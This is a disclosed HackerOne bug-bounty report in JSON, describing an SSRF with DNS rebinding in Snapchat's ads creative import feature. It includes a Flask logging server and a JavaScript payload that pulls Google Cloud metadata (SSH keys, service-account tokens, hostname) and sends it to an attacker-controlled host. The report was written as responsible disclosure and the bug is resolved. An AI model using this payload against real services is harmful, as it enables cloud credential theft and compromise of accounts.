{
  "id": 530974,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzA5NzQ=",
  "url": "https://hackerone.com/reports/530974",
  "title": "Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2019-04-08T05:29:28.539Z",
  "submitted_at": "2019-04-08T05:29:28.539Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "nahamsec",
    "url": "/nahamsec",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 513,
    "url": "https://hackerone.com/snapchat",
    "handle": "snapchat",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Snapchat",
      "twitter_handle": "",
      "website": "https://www.snapchat.com/",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-11-30T18:27:26.494Z",
  "bug_reporter_agreed_on_going_public_at": "2020-11-30T18:27:26.432Z",
  "team_member_agreed_on_going_public_at": "2020-11-30T13:37:24.599Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hey there, \nI was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app. Here are the steps:\n\n#POC\n- Login to https://business.snapchat.com/\n- Go to creative library -> New Creative \n- Under \"Topsnap Media\", click on \"Create\"\n- Click on any of the templates and load it\n- Click on one of the images in the template -> Replace -> Import\n- _This is where the SSRF exists_. Where you fetch images for your creative (`/api/v1/media/import`)\n-  Run this somewhere publicly accessible:\n\n```\nfrom flask import Flask, request\nfrom flask_cors import CORS\nfrom time import sleep\n\napp = Flask(__name__)\nCORS(app)\n\nimport logging\nlog = logging.getLogger('werkzeug')\nlog.setLevel(logging.ERROR)\n\n@app.route(\"/\")\ndef helloWorld():\n        sleep(3)\n        return 'hi!'\n\n@app.route('/log')\ndef log():\n        print request.args['msg']\n        return ''\n\napp.run(host='0.0.0.0')\n```\n\n- Put this on another domain you control. Change demon.██████████ to the host where you put this html file, and change ssh.████ to the host you're running the timing script (above) on.\n\n```\n<script>\nvar logTimeServer = 'ssh.█████';\nvar attackServer = 'demon.██████';\n\nfunction log(data) {\n    var sreq = new XMLHttpRequest();\n    sreq.open('GET', 'http://' + logTimeServer + ':5000/log?msg=' + encodeURI(data), true);\n    sreq.send();\n}\n\nfunction get(url) {\n    try {\n        var req = new XMLHttpRequest();\n        req.open('GET', url, false);\n        req.setRequestHeader('X-Google-Metadata-Request', 'True');\n        req.send(null);\n        if(req.status == 200)\n            return req.responseText;\n        else\n            return '[failed status=' + req.status + ']';\n    } catch(err) {\n        log(err);\n    }\n    return null;\n}\n\nlog('Triggered in ' + window.location.href);\n\nfor(var i = 0; i < 60; ++i) {\n    log('Loop ' + i);\n    var req = new XMLHttpRequest();\n    req.open('GET', 'http://' + logTimeServer + ':5000/', false);\n    req.send();\n}\nlog('SSH Keys: ' + get('http://' + attackServer + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json'));\nlog('Service Accounts: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json'));\nlog('Hostname: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/hostname'));\n</script>\n```\n\n- Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)\n- Immediately after requesting `ssrf.html`, switch the DNS on the domain to point to 169.254.169.254, and wait 3 minutes.  ssrf.html needs to be running on port 80, that way when the DNS changes, it starts talking to the metadata service.\n\n## Impact\n\n#SSH Keys:\n\n```\nSSH Keys: \"██████\"\n```\n\n#Hostname: \n`█████████`",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 384,
  "voters": [
    "milly",
    "fernale",
    "axelomega",
    "daviey",
    "pizzapower",
    "mhmmdazhari",
    "pretorian",
    "b19r8a14",
    "al-madjus",
    "lowtoe",
    "and 374 more..."
  ],
  "structured_scope": {
    "databaseId": 11824,
    "asset_type": "URL",
    "asset_identifier": "snappublisher.snapchat.com",
    "max_severity": "high"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 25257,
      "category": "team",
      "content": "@nahamsec, @daeken and @ziot found a Server-Side Request Forgery (SSRF) vulnerability in https://business.snapchat.com which they exploit by providing a custom webpage configured to utilize DNS rebinding to access internal web endpoints like the Google Metadata Service. Using this they are able to mint tokens for the service-account assigned to the instance hosting the Chrome instances used for extracting webpages assets for media projects.",
      "user": {
        "id": 293963,
        "username": "apfeifer_sc",
        "name": "Ansgar Pfeifer",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2018-06-18T21:45:07.172Z",
        "url": "https://hackerone.com/apfeifer_sc",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
